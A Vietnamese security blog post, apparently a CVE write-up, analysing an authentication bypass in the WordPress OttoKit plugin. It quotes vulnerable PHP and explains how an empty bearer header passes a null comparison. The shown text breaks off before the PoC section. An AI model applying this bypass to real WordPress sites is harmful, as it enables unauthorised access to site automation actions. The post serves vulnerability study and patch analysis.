<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-3102 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress OttoKit Plugin."><meta name="keywords" content='analyst, plugin, Bypass Vulnerability'>
  <meta itemprop="name" content="CVE-2025-3102 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress OttoKit Plugin.">
  <meta itemprop="datePublished" content="2026-01-14T19:00:00+07:00">
  <meta itemprop="dateModified" content="2026-01-14T07:40:48+07:00">
  <meta itemprop="wordCount" content="2278">
  <meta itemprop="image" content="http://localhost:1313/posts/2026-01-14-cve-2025-3102/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Bypass Vulnerability"><meta property="og:url" content="http://localhost:1313/vi/posts/2026-01-14-cve-2025-3102/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-3102 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress OttoKit Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-14T19:00:00+07:00">
    <meta property="article:modified_time" content="2026-01-14T07:40:48+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Bypass Vulnerability">
    <meta property="og:image" content="http://localhost:1313/posts/2026-01-14-cve-2025-3102/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2026-01-14-cve-2025-3102/app.png">
  <meta name="twitter:title" content="CVE-2025-3102 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress OttoKit Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2026-01-14-cve-2025-3102/" title="CVE-2025-3102 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2026-01-13-cve-2025-6688/" title="CVE-2025-4796 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2026-01-15-cve-2025-12788/" title="CVE-2025-12788 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2026-01-14-cve-2025-3102/index.md" title="CVE-2025-3102 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-3102 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2026-01-14-cve-2025-3102\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, Bypass Vulnerability","wordcount":  2278 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2026-01-14-cve-2025-3102\/","datePublished": "2026-01-14T19:00:00+07:00","dateModified": "2026-01-14T07:40:48+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress OttoKit Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Đổi chủ đề" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2026-01-14-cve-2025-3102/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2026-01-14-cve-2025-3102/">English</option><option value="/vi/posts/2026-01-14-cve-2025-3102/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2026-01-22-cve-2025-11707/" title="CVE-2025-11707 Analysis &amp; POC">CVE-2025-11707 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-15-cve-2025-12788/" title="CVE-2025-12788 Analysis &amp; POC">CVE-2025-12788 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-13-cve-2025-6688/" title="CVE-2025-4796 Analysis &amp; POC">CVE-2025-4796 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-12-cve-2025-4796/" title="CVE-2025-4796 Analysis &amp; POC">CVE-2025-4796 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-11-cve-2025-8059/" title="CVE-2025-8059 Analysis &amp; POC">CVE-2025-8059 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-08-cve-2025-14156/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-07-cve-2025-2563/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-06-cve-2025-7654/" title="CVE-2025-7654 Analysis &amp; POC">CVE-2025-7654 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-05-cve-2025-55707/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-04-cve-2025-53425/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-3102 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analysis/" class="post-category" title="Danh mục - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="đăng ngày 2026-01-14 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-14">2026-01-14</time></span>&nbsp;<span title="Cập nhật ngày 2026-01-14 07:40:48"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-14">2026-01-14</time></span>&nbsp;<span title="2278 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 2300 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>11 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img loading="eager" src='/posts/2026-01-14-cve-2025-3102/app.png' sizes="(max-width: 680px) 100vw, (max-width: 960px) 80vw, (max-width: 1440px) 56vw, 800px" alt="/posts/2026-01-14-cve-2025-3102/app.png" height="500" width="1544"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-3102" target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-3102</a></li>
<li><strong>Vulnerability Type</strong>: Bypass Vulnerability</li>
<li><strong>Affected Versions</strong>: &lt;= 1.0.78</li>
<li><strong>Patched Versions</strong>: 1.0.79</li>
<li><strong>CVSS severity</strong>: High (8.1)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/suretriggers/" target="_blank" rel="external nofollow noopener noreferrer">WordPress OttoKit Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/" target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/" target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li><strong>Plugin Version</strong> - <strong>OttoKit</strong>:
<ul>
<li><code>1.0.78</code> – <strong>vulnerable</strong></li>
<li><code>1.0.79</code> – <strong>patched</strong></li>
</ul>
</li>
<li><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/" target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ diff nào.</li>
</ul>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin đã đăng ký API như sau:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="RoutesController.php v1.0.78" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">RoutesController.php v1.0.78</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$rest_controller_obj</span>         <span class="o">=</span> <span class="nx">RestController</span><span class="o">::</span><span class="na">get_instance</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">register_rest_route</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SURE_TRIGGERS_REST_NAMESPACE</span><span class="p">,</span> <span class="c1">// sure-triggers/v1
</span></span></span><span class="line"><span class="cl">    <span class="s1">&#39;automation/action&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;methods&#39;</span>             <span class="o">=&gt;</span> <span class="nx">WP_REST_Server</span><span class="o">::</span><span class="na">CREATABLE</span><span class="p">,</span> <span class="c1">// POST, PUT, PATCH
</span></span></span><span class="line"><span class="cl">        <span class="s1">&#39;callback&#39;</span>            <span class="o">=&gt;</span> <span class="p">[</span> <span class="nv">$rest_controller_obj</span><span class="p">,</span> <span class="s1">&#39;run_action&#39;</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;permission_callback&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="nv">$rest_controller_obj</span><span class="p">,</span> <span class="s1">&#39;autheticate_user&#39;</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Với cấu hình trên, API endpoint đầy đủ sẽ có dạng:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/wp-json/sure-triggers/v1/automation/action</span></span></code></pre></td></tr></table></div>
</div>
</div><p>Khi có request đến endpoint trên với method hợp lệ thì callback <code>run_action</code> nhưng trước hết cần vượt qua hàm kiểm tra quyền <code>autheticate_user</code></p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="RestController.php v1.0.78" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">RestController.php v1.0.78</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">autheticate_user</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$secret_key</span>       <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_header</span><span class="p">(</span> <span class="s1">&#39;st_authorization&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">list</span><span class="p">(</span><span class="nv">$secret_key</span><span class="p">)</span> <span class="o">=</span> <span class="nx">sscanf</span><span class="p">(</span> <span class="nv">$secret_key</span><span class="p">,</span> <span class="s1">&#39;Bearer %s&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret_key</span> <span class="o">!==</span> <span class="nv">$secret_key</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Hàm <code>autheticate_user</code> dùng để xác thực người dùng dựa trên một secret key được gửi lên trong HTTP header.</p>
<p>Client sẽ gửi header dạng:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">st_authorization: Bearer ABC123SECRET</span></span></code></pre></td></tr></table></div>
</div>
</div><p>Server sẽ lấy <code>ABC123SECRET</code> ra để so sánh với secret key đã lưu trong hệ thống.</p>
<p>Khi plugin được <strong>install</strong> và <strong>active</strong> nhưng chưa cấu hình API key</p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-14-cve-2025-3102/ianda.png" title="Not set API key" data-thumbnail="/posts/2026-01-14-cve-2025-3102/ianda.png" data-sub-html="<h2>Not connect</h2><p>Not set API key</p>"><img loading="lazy" src='/posts/2026-01-14-cve-2025-3102/ianda.png' alt="Not connect" height="1118" width="1911"></a><figcaption class="image-caption">Not set API key</figcaption>
  </figure></p>
<p>Biến <code>$this-&gt;secret_key</code> sẽ có giá trị <code>null</code>. Nếu attacker gửi request không có header hợp lệ, giá trị <code>$secret_key</code> lấy từ request cũng sẽ là <code>null</code>. Khi so sánh:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// st_authorization: Bearer 
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret_key</span> <span class="o">!==</span> <span class="nv">$secret_key</span>   <span class="c1">// null !== null → false
</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Điều kiện kiểm tra thất bại và hàm trả về <code>true</code>, dẫn đến bypass xác thực.</p>
<p>Khi đó <code>run_action</code> được gọi để xử lý request</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="RestController.php v1.0.78" data-open="true"><div class="chroma">
